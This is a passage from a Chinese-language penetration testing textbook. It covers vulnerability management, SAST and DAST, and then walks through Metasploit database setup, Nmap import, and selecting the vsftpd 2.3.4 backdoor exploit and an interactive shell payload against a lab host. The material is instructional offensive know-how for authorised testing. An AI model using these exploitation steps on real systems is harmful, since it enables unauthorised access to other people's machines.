
## 9. 转换为报告：将 JSON 结果转换为 CSV 文件

访问网站 `https://data.page/json/csv`，如图 4.44 所示：

![](img/e4f93a89908ca3f498ee2517ddfbfd77_151_0.png)

图 4.44: 转换报告

> 注意：容器的安全性可以通过在镜像阶段和运行阶段对其进行扫描来确保。在部署之前，镜像扫描有助于识别漏洞和配置错误，而运行时扫描则监控并检测运行期间的任何潜在安全风险。

## 漏洞管理

漏洞管理是维护组织安全的关键方面。它涉及持续的努力以识别、评估和处理潜在的安全威胁和弱点。其目标是防止恶意攻击并最大限度地减少任何发生攻击的后果。

漏洞管理过程通常由几个步骤组成。第一步是漏洞评估，在该步骤中识别并评估潜在风险。这可以通过自动化扫描工具、手动渗透测试或者的结合来实现。接下来，优先级排序步骤涉及确定哪些漏洞对组织构成最大的风险并应该优先处理。这通常使用风险管理框架完成的，根据漏洞的潜在影响和被利用的可能性为每个漏洞分配严重性评分。

一旦识别并确定了漏洞优先级，就会实施应对措施来降低风险。这可能包括应用软件补丁、配置防火墙和入侵检测系统、培训员工安全实践，以及实施访问控制。

漏洞管理有两种主要方法：手动和自动化。在下表 4.1 中，你可以看到这些方法的定义和区别：

| 参数 | 手动漏洞管理 | 自动化漏洞管理 |
| --- | --- | --- |
| 安全专业人员干预 | 需要安全专业人员对系统和应用程序进行漏洞评估，对其进行优先级排序，并采取必要的步骤进行修复。 | 涉及软件工具扫描系统和应用程序的漏洞，提供自动检测、优先级排序和修复建议 |
| 定制化 | 更加全面，允许进行更大的控制和定制 | 支持的定制化较少 |
| 时间和资源消耗 | 耗时且耗资源 | 更快、更高效 |

**表 4.1: 漏洞管理方法**

> 注意：全面的漏洞管理通常涉及手动和自动化方法的结合。虽然自动化漏洞管理更快、更高效，但它可能只识别某些漏洞，其建议可能需要比手动评估获得的建议更高的准确性和定制性。

## 应用安全

应用安全或 `AppSec` 涵盖了在应用层发现、修复和避免软件、硬件和开发过程中安全弱点的实践和程序。将安全测试集成到软件开发生命周期（`SDLC`）的每个阶段（包括需求分析、设计、实现、验证和维护），对于及时全面检测并处理漏洞至关重要。通过从一开始引入 `AppSec` 实践，组织可以显著降低代码、`API` 以及应用程序中使用的第三方组件出现安全漏洞的风险。

应用安全包含两类：

- 静态应用安全测试 (`SAST`)：它检查应用程序的源代码以在部署之前检测安全漏洞。通过在开发过程早期识别潜在缺陷，`SAST` 可以减少后期处理这些问题所需的成本和精力。
- 动态应用安全测试 (`DAST`)：它在应用程序运行时对其进行测试，以发现源代码中可能不可见的漏洞、弱和其他问题。`DAST` 工具模拟对应用程序的攻击，识别攻击者可能利用的潜在漏洞，为应用程序的整体安全态势提供更准确的评估。

## 结论

在本章中，你对漏洞评估和相关的管理策略有了深入的理解。这些新知识和专业知识将使你能够使用手动和自动化方法对各种计算机基础设施进行深度漏洞评估。漏洞管理生命周期将鼓励你不断采用最佳安全实践，最终降低组织的风险成本。此外，你还洞察了准确且针对性的补丁管理的重要性，这将优化你漏洞评估计划的整体效能。掌握了这些知识，你已经准备好识别并修复组织计算机基础设施中的漏洞，使其更加安全，并对潜在的网络攻击具有更强的韧性。

下一章将深入探讨各种主题，涵盖利用网络漏洞和获得未经授权访问的技术。你可以在模拟的真实环境中参与这些技术的操作，与网络设备、数据库和服务器一起工作。在本章结束时，你将在网络渗透测试和利用方面建立坚实的基础，使你能够识别并处理网络漏洞。

## 加入我们书籍的 Discord 空间

加入书籍的 `Discord` 获取最新更新、优惠、全球科技动态、新发布以及与作者的互动会议：`https://discord.ggline`

![](img/e4f93a89908ca3f498ee2517ddfbfd77_154_0.png)

# 第 5 章
## 利用计算机网络

## 引言

在本章中，我们将深入探讨网络渗透测试的实际方面，通过演示之前章节中识别的漏洞进行利用。利用这些漏洞至关重要，因为有助于确定漏洞的严重性及其潜在影响。为了确保渗透人员全面理解网络安全态势，我们将使用开源工具和手动脚本在测试环境中演示利用。这种方法将使渗透人员能够模拟真实情况，获得实践经验。

## 结构

在本章中，我们将讨论以下主题：

- 理解网络渗透测试
- `Metasploit` 简介
- `Metasploit` 数据库和工作空间管理
- 将 `NMAP` 扫描集成到 `Metasploit`
- `Metasploit` 自动化
- 从辅助 (`auxiliary`) 和利用 (`exploits`) 开始
- 手动利用
- 使用 `Armitage` 进行利用

## 目标

在本章中，我们的目标是深入研究网络渗透方法，演示如何利用漏洞以理解其真实影响。这种实践方法加深了对网络安全的理解，并强调了攻击前收集信息的重要性。通过使用开源工具和手动脚本，我们重建了真实场景以获得全面的理解。

## 理解网络渗透测试

网络渗透测试是识别和缓解组织网络潜在安全风险的关键步骤。在此过程中，渗透人员必须尝试利用已识别的漏洞以获得未经授权的访问或执行可能对组织造成重大损害的未经授权的操作。网络渗透涵盖所有网络设备，包括服务器、数据库和安全控制。高级网络渗透测试通常涉及多个阶段，包括利用、横移动、维持访问、撤销更改、报告与记录以及修复，如图 5.1 所示：

![](img/e4f93a89908ca3f498ee2517ddfbfd77_157_0.png)

图 5.1：高级网络渗透测试阶段

对于渗透人员来说，理解网络测试对目标环境的意义和潜在影响至关重要。因此，他们必须对目标基础设施有清晰的了解，包括其硬件、软件和网络组件。这些知识将使渗透人员选择合适的攻击向量和技术，同时最大限度地减少任何负面后果。网络渗透测试的成功取决于在侦察和漏洞阶段收集的信息的准确性和完整性。

> 注意：在生产环境中进行渗透测试时，确保操作不会对目标环境造成任何损害或干扰至关重要。渗透人员在整个网络渗透测试过程中必须保持专业素养并遵守伦理准则。

## Metasploit 简介

`Metasploit` Framework 由 `HD Moore` 于 2003 年开发，现在由 `Rapid7` 维护，是一个开源软件工具，被渗透人员、安全研究人员和黑客用于渗透测试、漏洞扫描和利用开发。它使用 `Ruby` 语言编写，旨在提供灵活性和扩展性，使用户可以定制自己的利用程序和载荷（`payload`）。`Metasploit` Framework 提供了许多功能和特性，如下 5.2 所示：

图 5.2：`Metasploit` 框架的功能和特性

平台的主要功能之一是为针对远程目标开发、测试和执行利用程序提供空间。它拥有庞大的利用程序、载荷和辅助模块库，允许用户评估计算机系统和网络的安全性。此外，安全专业人员使用 `Metasploit` Framework 来衡量其安全防御的效率，并针对潜在攻击制定防御方案。

> 注意：`Metasploit` 是一个用于攻击和防御安全的通用工具。安全专业人员依靠它来测试安全措施的有效性并发现潜在漏洞。

## Metasploit 数据库与工作区管理

`Metasploit` 的关键属性是其 `Metasploit` 数据库，它可以有效地在中央数据库中存储和管理与目标、漏洞、会话和利用的数据。例如，在评估期间发现漏洞时，`Metasploit` 数据库可以监控漏洞利用的进度并跟踪攻击的成功。

此外，存储的数据库对所有目标和开放端口进行重新验证非常有用，以检查最新的可利用状态。由于 `Metasploit` 数据库可以于导出、导入并在渗透人员之间共享，它允许从当前阶段就开始进行无缝协作。此外，数据库能够生成详细报告，并对目标系统的安全态提供广泛的见解。

让我们通过以下步骤和命令创建并管理新工作区，深入研究 `Metasploit` 数据库：

1. 运行命令 `systemctl start postgresql` 启动 `PostgreSQL` 服务器，如图 5.3 所示：

```
(ummedneel@kali)-~/Desktop

$ systemctl start postgresql
```

图 5.3：启动 `PostgreSQL` 服务器

2. 使用命令 `msfconsole` 启动 `Metasploit` Framework，如下图 5.4 所示：

```
(ummedneel@kali)-~/Desktop

$ msfconsole
```

![](img/e4f93a89908ca3f498ee2517ddfbfd77_159_0.png)

```
[ metasploit v6.2.30-dev]

+ -- 2272 exploits - 1191 auxiliary - 404 post

+ -- 945 payloads - 45 encoders - 11 hoops

+ -- 9 evasion
```

`Metasploit` 提示：使用 `show missing` 查看运行模块选项
`Metasploit` 文档：`https://docs.metasploit.com/`
`msf6 >`

图 5.4：启动 `Metasploit` Framework

3. 运行命令 `sudo msfdb init` 初始化 `Metasploit` 数据库，如下图 5.5 所示：

```
(ummedneel@kali)-~/Desktop

$ sudo msfdb init

[+] Starting database

[+] Creating database user 'msf'

[+] Creating databases 'msf'

[+] Creating database 'msf_test'

[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'

[+] Creating initial database schema
```

图 5.5：初始化 `Metasploit` 数据库

4. 要检查数据库连接状态，运行命令 `db_status`，如下图 5.6 所示：

```
msf6 > db_status

[*] Connected to msf. Connection type: postgresql

-- : Check the database connectivity status
```

图 5.6：检查数据库状态

5. 使用命令 `workspace [workspace_name]` 创建新工作区，如图 5.7 所示：

```
msf6 > -a ummed_metasploit

[*] Added workspace: ummed_metasploit

[*] workspace: ummed_metasploit

msf6 > |
```

图 5.7：创建一个新工作区

6. 使用命令 `workspace [workspace_name]` 选择新创建的工作区，如图 5.8 所示：

```
msf6 > workspace ummed_metasploit

[*] Workspace: ummed_metasploit
```

图 5.8：选择新创建的工作区

7. 使用命令 `workspace` 查看可用工作区的完整列表，如图 5.9 所示：

```
msf6 > workspace

default

delta_pm

test_project

* ummed_metasploit

msf6 > |
```

图 5.9：查看可用工作区的完整列表

> `Metasploit` 提供数据库管理和工作区管理功能。前者涉及使用 `msfdb` 管理 `PostgreSQL` 数据库，后者允许用户组织与不同安全评估或项目相关的数据。

## 将 NMAP 扫描集成到 Metasploit

创建 `Metasploit` 数据库后，我们可以在 `VAPT`（漏洞评估与渗透测试）练习中利用其实用。例如，可以将 `Nmap` 扫描结果以 `XML` 格式导出并导入 `Metasploit`，以避免端口扫描的重复。此功能可以为渗透人员节省大量的精力和时间，因为他们可以同时对多个目标运行利用。此外，数据库允许对 `Nmap` 数据进行多级分析，例如识别有多少主机开放了端口 `443`，或有多少主机运行 `Windows` 操作系统等。

要学习如何将 `Nmap` 扫描结果导入 `Metasploit`，运行 `db_import [nmap_file]` 命令，如图 5.10 所示：

```
msf6 > db_import /home/ummed/Desktop/nmap.xml

[*] Processing /home/ummed/Desktop/nmap.xml

[*] Imported 1 hosts
```

图 5.10：将 `Nmap` 扫描结果导入 `Metasploit`

现在，为了学习如何利用 `FTP` 服务，可以遵循以下逐步方法：

1. 在整个数据库中搜索 `Linux` 机器，执行命令：`hosts -c address,os_flavor -S`，如图 5.11 所示：

```
msf6 > hosts -c address,os_flavor -S Linux

Hosts
```

| address | os_flavor |
|---|---|
| 192.168.1.129 | Linux ( ) |

2. 同样，搜索开放端口 `21` 的主机，使用命令 `services -c info,name -p 21`，如图 5.12 所示：

```
msf6 > services -c info,name -p 21

Services
```

| host | info | name |
|---|---|---|
| 192.168.1.129 | vsftpd 2.3.4 | ftp |

3. 将选定的主机作为目标，执行命令 `services -c info,name -p 21 -R`。此命令将所有主机添加到目标列表中，并在它们上执行相同的利用，见图 5.13：

```
msf6 > services -c info,name -p 21 -R

Services
```

| host | info | name |
|---|---|---|
| 192.168.1.129 | vsftpd 2.3.4 | ftp |

4. 要在数据库中搜索特定服务的可用利用程序，执行命令 `search vsftpd`，如图 5.14 所示：

```
msf6 > search vsftpd

Matching Modules
```

| Name | Disclosure Date | Rank | Check | Description |
|---|---|---|---|---|
| exploit/unix/ftp/vsftpd_234_backdoor | 2011-07-03 | excellent | No | exploit v2.3.4 Backdoor Command Execution |

通过名称或索引与模块交互。例如 `info 0`, `use 0` 或 `use exploit/unix/ftp/vsftpd_234_backdoor`。

5. 要从利用数据库中选择可用载荷，执行命令 `use exploit/unix/ftp/vsftpd_234_backdoor` 然后执行命令 `show options`。你将看到之前选定的目标已经反映在其中，如图 5.15 所示：

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor

[] No configurator found, defaulting to cmd/unix/interact

msf exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

Module options (`exploit/unix/ftp/vsftpd_234_backdoor`):

| Name | Current Setting | Required | Description |
| --- | --- | --- | --- |
| RHOST | 192.168.1.129 | yes | 目标主机(s)，见 `https://github.com/rapid/metasploit-framework/wiki/Using` |
| RPORT | 21 | | 目标端口 (tcp) |

Payload options (`cmd/unix/interact`):

| Name | Current Setting | Required | Description |
| --- | --- | --- | --- |
| @ | Automatic | yes | 查看完整的模块信息 `-d` 命令。 |

**图 15: 使用合适的 exploit**

6. 此外，为了找到合适的 `payload`，执行 `show payloads` 命令，然后通过执行 `set payload cmd/unix/interact` 来选择 `payload`，如图 16 所示：

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
```

| Name | Disclosure | Rank | Check | Description |
| --- | --- | --- | --- | --- |
| cmd/unix/interact | | normal | No | Unix 命令，已建立连接 |

```
msf exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact

msf exploit(unix/ftp/vsftpd_234_backdoor) > |
```
